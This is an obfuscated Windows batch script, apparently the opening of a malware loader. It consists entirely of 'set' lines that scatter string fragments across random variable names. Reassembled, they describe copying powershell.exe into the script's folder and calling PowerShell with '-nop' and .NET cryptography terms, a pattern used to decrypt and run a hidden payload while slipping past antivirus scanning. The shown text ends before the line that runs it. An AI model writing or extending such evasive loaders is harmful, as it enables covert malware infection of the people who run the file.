@echo off
set "KuGuIhBzMg=rs"
set "sCXMINgVRM=py"
set "DAxikMkdeh=1."
set "ydgFnVLLpy=co"
set "lbxJMCeISe=xe"
set "FTXFZbqFfH=0\"
set "HBPjKyrtPp=nd"
set "LAEVIpwhhn=32"
set "JAmUXVqmMc=Wi"
set "nEWWVswXzK=he"
set "nRaRJhtLuX=y "
set "qhaZAcQxpE=we"
set "EbJEVVxKCo=ll"
set "BMqWXKgkuN= /"
set "hLZngeEBtj=we"
set "TXLdKvsCZb=:\"
set "MjxcADuQcm=do"
set "OVBmPkZogi=in"
set "eYMKCyFRpC=st"
set "nuMACPZsgx=Po"
set "zkVuFuQTbm=ow"
set "SBWGXNAkPI=po"
set "vDVPdtNRPT=s\"
set "wPlVWxUBXQ=.e"
set "WFGqucDRkx=he"
set "HjONmsiCtl=Sy"
set "cyKcrQXurk=ws"
set "azeMhmkLYm=\v"
set "exkzGeFZfq=em"
set "loAQiwRlnE=\W"
set "UaMMPYwBQU= C"
set "cajaCplyUY=rS"
set "lanvZUUKyV=ll"
set "kjlCtviaVe= %~dp0"
set "XWyURBFjfP=cd"
set "IIqZIzqYVC=morF"
set "jIpZoRZAii=pDHI"
set "tHUYANiuKJ=h = "
set "BuAtCOnScG=tion"
set "cxTevWGSyp=WGI."
set "UWpiNqnCNj= [st"
set "XVZmbSEVKR= '')"
set "LDuzOTlGUq=Mode"
set "doQlBDOfwK=oL'["
set "gTuBTOrqxN=ct S"
set "MLXhYylNPh=and "
set "xYjLEcMHuU=Ij, "
set "FhgSDkWvJA=-nop"
set "BkIXjdNLkJ=grap"
set "QmTMXXJKqr=sion"
set "ydNpSuPFGX=[Sys"
set "zCszFfSDPQ=h, 0"
set "uNujfwMrmq=tS46"
set "kosbDIzrre=Obje"
set "YvevvFCOYc=saBm"
set "dnCSbVmLCG=yinX"
set "hsarUrseRL=();$"
set "nvQDTPJBVG=Secu"
set "SjgLrnuyLm=hy.A"
set "towhFzRIAb=i.Su"
